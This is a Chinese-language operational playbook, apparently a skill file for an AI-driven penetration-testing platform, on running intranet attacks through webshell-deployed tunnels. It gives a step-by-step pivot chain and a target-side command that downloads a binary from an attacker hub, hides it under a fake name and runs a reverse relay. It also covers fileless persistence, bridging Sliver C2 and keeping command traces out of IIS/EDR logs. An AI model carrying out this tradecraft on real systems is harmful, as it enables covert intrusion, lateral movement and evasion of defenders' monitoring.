---
name: tunnel-data-plane
description: >-
  隧道数据面端到端剧本：webshell 只作入口（第一公里），内网/横向/内网 Web 作业全部走隧道——webshell_tunnel page/start 部署页面隧道 → proxy_toggle select 切隧道出口（tunnel:ws_<id>）→ http_probe/port_scan/nuclei 走隧道打私网 → stop+cleanup 收尾。数据面优先级：webshell 页面隧道 > sliver 内建 socks > netd-slim rtcp 反绑隧道（经已控公网枢纽，netd_tunnel open）> relay/gost 反向隧道（需中继 VPS）> chisel 兜底；正向 gost 禁止（宿主 NAT 实测死路）。Use when doing intranet work over a webshell, switching data plane under pressure, or recovering data plane with only a webshell left.
metadata:
  roles: [后渗透测试, 渗透测试]
  stages: [post]
  tags: [渗透测试, 内网渗透, 隧道, 后渗透]
---

# 隧道数据面（webshell 只作入口，作业走隧道）

> 纪律源头 `skills/c2-opsec/SKILL.md`（webshell 只做第一公里）+ 数据面决策依据
> `docs/archive/webshell靶场实战评估-gost构建瘦身与数据面决策.md`。本剧本把散在各工具
> 描述里的编排接成一条端到端链路。

**为什么必须有这条链**：架构要求「webshell 只作入口、数据面走隧道」，但编排知识散在
各工具描述里时，实操会滑回 webshell_exec 全包干——印尼项目 7 天 1521 次 exec、隧道只
试过 3 次。exec 压信道（IIS/EDR 审计命令行）、长命令超时丢结果、每次侦察都重付信道成本。

## 触发场景

1. 拿到 webshell 后要打内网/横向/内网 Web 作业（私网目标探测、目录爆破、登录页验证）；
2. webshell 通道变慢/被盯上（目标侧日志回看变严），要换数据面而不是加码 exec；
3. sliver 会话断连只剩 webshell：先恢复页面隧道数据面，再考虑重投 implant
   （implant C2 也可经同一信道回平台：`webshell_tunnel action=pipe`）。

## 数据面决策树（先分类再选，禁跳步）

| 优先级 | 数据面 | 前置条件 | 入口工具 |
| --- | --- | --- | --- |
| 1（首选） | webshell 页面隧道 | 已控壳（PHP/JSP） | `webshell_tunnel page/start` |
| 2 | sliver 内建 socks | 有活会话 | sliver 会话 socks |
| 3 | netd-slim rtcp 反绑隧道 | 有已控公网枢纽（跑 gost relay server，如 103:45200）且目标可访问枢纽 | `netd_tunnel open`（目标侧铺 netd-slim） |
| 4 | relay/gost 反向隧道 | 活的公网中继 VPS | `relay_tunnel` / `gost_channel` |
| 5（兜底） | chisel | 目标可出网且端口按 egress_ports 探测通过 | `chisel` |
| 禁止 | 正向 gost（目标绑新端口对外） | —— | 宿主 NAT 实测死路：新监听端口外部全部 refused，SYSTEM 也够不着映射表 |

- 1 首选理由：零额外落盘产物、骑在既有壳信道上、NAT 后目标普适、不依赖中继 VPS。
- 3 的前置不满足时（当前无活中继节点）明确记录「不可用」并降级，不要空试部署链。
- 拿壳先 `netstat` + 查已有进程：前人留下的代理若本机可达，可直接当数据面用。

## 端到端时序（每步对号入座，漏一步链路就断）

```
1. manage_webshell_test          探活：参数形态自动级联自愈 + whoami/dir 确认壳活着
2. webshell_tunnel action=page   生成隧道页（lang 默认按连接类型；PHP 页依赖单 worker，多 worker 用 JSP）
3. webshell_file_write           部署：content 原样写到 page_path（URL 路径，与现有 shell 同目录同一 webapp）
4. webshell_tunnel action=start  平台侧拉起 socks5，返回 listen_addr（运营侧代理入口）
5. webshell_tunnel action=status 确认会话在跑、上下行字节在动——先确认再切流量
6. proxy_toggle action=select proxy_id=tunnel:ws_<id>
                                 ★关键步：把本会话出站切到隧道出口。隧道出口会动态注册进
                                 netproxy，名字形如 tunnel:ws_<id>（proxy_status 可查）。
                                 漏了这步，工具流量不走隧道，私网目标全部不可达/从默认出口裸奔。
7. 内网作业                       http_probe / port_scan / nuclei 走隧道出口打私网目标；
                                 产出照常落黑板（info_entry_upsert / upsert_project_fact /
                                 record_vulnerability），与直连作业同一套登记闭环
8. webshell_tunnel action=stop   收尾：停隧道、清平台侧会话（隧道是内存态，不停也随重启消失）
9. cleanup                       删目标上的隧道页（一条 rm/del 命令），清理义务记账，不留隧道页
```

## netd-slim rtcp 反绑隧道（多主机内网面批量形态）

目标侧跑超瘦 netd（构建中心 artifact `netd-slim`，8.9MB/gzip 3.49MB；rtcp 反绑+socks5
认证+可选 -L 正向转发，断链自动重绑），平台侧 `netd_tunnel` 拉起 gost 转发并注册出口。
适合「一个公网枢纽 + N 台已控目标」的批量内网面：每目标在枢纽侧占一个 127.0.0.1:19xxx
反绑端口，平台每目标一条 `netd_tunnel open`。

```
目标侧（webshell 第一公里，一条命令）：
  curl -s http://<枢纽分发点>/netdslim.bin.gz | gunzip > /tmp/.<拟真名> && chmod 700 …
  setsid /tmp/.<拟真名> -f 'relay+ws://<枢纽IP>:45200?path=/ws&host=<vhost>' \
      -b 127.0.0.1:<BINDPORT> -u <user:pass> [-L 'tcp://127.0.0.1:18080/<内网服务>'] &
平台侧（每目标一条）：
  netd_tunnel open {id:<锚点>, platform_port:29xxx, bind_port:<BINDPORT>,
    forward:'http://127.0.0.1:7890,relay+ws://<枢纽IP>:45200?path=/ws&host=<vhost>',
    auth:'<user:pass>', target_host:<主机名>}
  proxy_toggle select netd:<id>   → http_probe/port_scan/nuclei 以该目标网络视角出站
```

- **枢纽侧凭据统一管理**：socks 认证全舰队共用一组（记入项目事实表），BINDPORT 按目标
  端口表分配并回读核对（枢纽上 `netstat -ano | findstr 127.0.0.1:19`）。
- **-L 内建转发可当 C2 入口**：`-L tcp://127.0.0.1:18080/127.0.0.1:8082` 把枢纽本机
  sliver http 监听桥到目标回环，implant c2 写 `http://127.0.0.1:18080`——走 relay 二进制
  流，**天然免疫枢纽 HTTP 前置（Apache/Nginx）的解析类怪癖**（印尼现场实测：Apache 对
  POST+body+无 Content-Type 请求直接挂死，反代方案全军覆没，-L 方案全舰队上线）。
- **出口是运行态**：平台重启注册清空但转发进程仍活，重跑 `open` 自动「收编既有监听」
  只补注册；目标侧 netd 断枢纽 5s 内自动重绑。
- **hairpin 陷阱**：出口切到某主机自身后，对该主机公网 webshell 发命令会 network
  unreachable——操作某台前先 `proxy_toggle reset` 或换别家出口。
- **KB 级落地**：目标侧 dropper（~1KB 脚本：curl 拉 gz→mktemp→setsid 执行→rm）可让
  netd/implant 以无文件名 inode 常驻；/proc/<pid>/exe 显示 (deleted) 是已知 tradeoff。

## 纪律/红线

- **webshell 只做第一公里**：拿 shell、部署隧道页、收尾清理；长作业不反复 exec 压信道
  （侦察与后续操作走隧道，目标侧日志里只剩少量短命令）。
- **隧道是传输层，不改变 scope**：打谁仍按授权，私网目标同样要在 target_scope 内，越界
  目标只记 Fact 不探测。
- **收尾必 stop + cleanup**：平台侧会话与目标侧隧道页都清，缺一即留尾巴。
- **出网被封只剩 webshell 时优先页面隧道**：不要蛮力重试 exec、不要急着重投 implant。
- 确需经壳执行的长命令必须后台化（Windows `cmd /c start /b`、Linux `nohup … &`），
  重试前先查目标进程防重复执行（c2-opsec 同款）。

## 坑位（实测来）

- **URL >7000 字符自动降 POST form**：query-only 壳不兼容大分块，平台自动退小块
  （Windows 命令行 8191 上限 → 原始约 5500/块）。大文件一律走分块：
  `webshell_file_write` >96KB 自动分块，`artifact_upload` 自动分块 + 字节终验。
- **page_path 是 URL 路径**（`/ztun.jsp`），不是文件系统路径——传错会 404，且幂等启动
  会掩盖问题；Bitnami 类容器同一壳可能挂多个 context，页面必须写到 shell 实际所在目录旁。
- **隧道页部署后先 status 确认再切流量**：前端多层路由下写入后公开可达有约 1 分钟传播
  延迟（先 404 后 200 属正常），别把传播延迟误判为部署失败。
- **PHP 隧道页依赖单 worker**（fpm pm=1 / mod_php 单进程），多 worker 目标换 JSP 页。
- 手工验证 curl 用 `--proxy socks5h://` 形式；平台工具链走 `proxy_toggle select`，不手工拼。
- **隧道为内存态**：平台重启即失，重 `start` 即可（页仍在目标上，重连成本低）。
